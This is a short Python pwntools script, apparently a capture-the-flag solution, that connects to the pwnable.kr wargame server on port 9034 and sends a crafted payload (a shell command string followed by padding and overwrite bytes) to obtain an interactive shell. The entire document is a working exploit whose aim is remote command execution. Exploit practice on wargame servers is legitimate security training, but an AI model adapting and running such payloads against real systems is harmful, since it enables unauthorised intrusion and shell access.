from pwn import *

def main():
    p = remote("pwnable.kr", 9034 )
    payload = b"nv sh -c bash "+b"A"*(256-17) +b"$\x01\x00"
    p.sendline(payload)
    p.interactive()


if __name__ =="__main__":
    main()
